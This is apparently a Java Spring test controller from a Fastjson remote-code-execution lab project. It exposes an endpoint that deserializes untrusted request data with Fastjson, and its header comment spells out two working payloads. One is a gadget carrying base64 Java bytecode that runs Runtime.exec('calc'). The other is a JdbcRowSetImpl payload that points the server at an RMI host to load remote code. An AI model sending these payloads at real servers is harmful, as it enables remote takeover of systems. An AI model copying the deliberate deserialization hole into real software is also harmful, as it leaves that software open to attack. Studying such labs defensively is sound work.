package com.lyhistory.rce.fastjson.webhost;

import javax.servlet.http.HttpServletRequest;

import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;

/***
 * 
 * @author yue.liu
 * Another Method to send attack payload
 * 
 * LocalTest:
 * 	online tool convert Exploit.class to base64 encode, https://www.browserling.com/tools/file-to-base64
 * 	http://127.0.0.1/testController/Fastjson
 * 	?data={"@type": "com.lyhistory.rce.fastjson.Exploit","_bytecodes": ["yv66vgAAADIAKQcAAgEAImNvbS9seWhpc3RvcnkvcmNlL2Zhc3Rqc29uL0V4cGxvaXQHAAQBABBqYXZhL2xhbmcvT2JqZWN0AQAGPGluaXQ+AQADKClWAQAEQ29kZQoAAwAJDAAFAAYKAAsADQcADAEAEWphdmEvbGFuZy9SdW50aW1lDAAOAA8BAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7CAARAQAEY2FsYwoACwATDAAUABUBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7CgAXABkHABgBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAAaAAYBAA9wcmludFN0YWNrVHJhY2UBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAkTGNvbS9seWhpc3RvcnkvcmNlL2Zhc3Rqc29uL0V4cGxvaXQ7AQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEADVN0YWNrTWFwVGFibGUBAARtYWluAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgoAAQAJAQAEYXJndgEAE1tMamF2YS9sYW5nL1N0cmluZzsBAApTb3VyY2VGaWxlAQAMRXhwbG9pdC5qYXZhACEAAQADAAAAAAACAAEABQAGAAEABwAAAHgAAgACAAAAFiq3AAi4AAoSELYAElenAAhMK7YAFrEAAQAEAA0AEAAXAAMAGwAAABYABQAAAAQABAAGAA0ACAARAAkAFQALABwAAAAWAAIAAAAWAB0AHgAAABEABAAfACAAAQAhAAAAEAAC/wAQAAEHAAEAAQcAFwQACQAiACMAAQAHAAAAQQACAAIAAAAJuwABWbcAJEyxAAAAAgAbAAAACgACAAAADQAIAA4AHAAAABYAAgAAAAkAJQAmAAAACAABAB8AHgABAAEAJwAAAAIAKA=="],"_name": "a.b","_tfactory": {},"_outputProperties": {}}
 * 
 * RmiTest:
 * 	http://127.0.0.1/testController/Fastjson
 * 	?data={"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://127.0.0.1:1099/Exploit","autoCommit":true}
 * 
 */
@RestController
@RequestMapping("/testController")
public class TestController {
	
	@RequestMapping(value="/Fastjson")
	public String fastjson(Model model, HttpServletRequest request) {
		String data = request.getParameter("data");
		Object obj = JSON.parseObject(data, Object.class); //,Feature.SupportNonPublicField)
		model.addAttribute("result", obj.getClass());
		return "index";
	}
}
